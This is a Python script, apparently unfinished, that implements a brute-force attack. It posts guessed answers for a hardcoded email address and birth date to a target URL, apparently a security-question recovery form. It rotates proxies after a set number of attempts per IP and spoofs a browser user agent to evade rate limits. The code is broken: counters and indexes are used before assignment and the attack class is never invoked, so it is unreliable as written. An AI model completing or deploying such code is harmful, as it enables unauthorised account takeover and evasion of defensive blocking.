import argparse
import sys
from packages.utils import collect_input_args, validate_input_args
import urllib.request, urllib.error, urllib.response, urllib.parse


class Bruteforcer:
    def __init__(self, mode, url, proxies, attemps_per_ip) -> None:
        self.mode = mode
        self.url = url
        self.proxies = proxies
        self.attemps_per_ip = attemps_per_ip
        # self.url = get_url()
        # self.logins_list = get_logins_list()
        # self.passwords_list = get_password_list()
        pass


class BruteforceMode(Bruteforcer):
    def __init__(
        self, mode, url, login, passwords_list, proxies, attemps_per_ip
    ) -> None:
        super().__init__(mode, url, proxies, attemps_per_ip)
        self.login = login
        self.passwords_list = passwords_list

    def perform_bruteforce(self):
        for answer in self.passwords_list:
            if counter < super().attemps_per_ip:
                data = (
                    '{"email":"testowe10071997@wp.pl","answers":["'
                    + answer
                    + '"],"birthDate":"1997-07-10"}'
                )
                data_bytes = str.encode(data)
                print(f"IP: {super().proxies[index]}, Data: {data}")
                proxy_handler = urllib.request.ProxyHandler(
                    {"http": super().proxies[index]}
                )
                opener = urllib.request.build_opener(proxy_handler)
                opener.addheaders = [("User-agent", "Mozilla/5.0")]
                urllib.request.install_opener(opener)
                # sock = urllib.request.urlopen("http://ident.me/")
                request = urllib.request.Request(super().url, data=data_bytes)
                with urllib.request.urlopen(request, timeout=10) as response:
                    print(response.status)
                counter = counter + 1
            else:
                index = index + 1
                counter = 0


parser = argparse.ArgumentParser()
args = collect_input_args(parser)
validate_input_args(args)
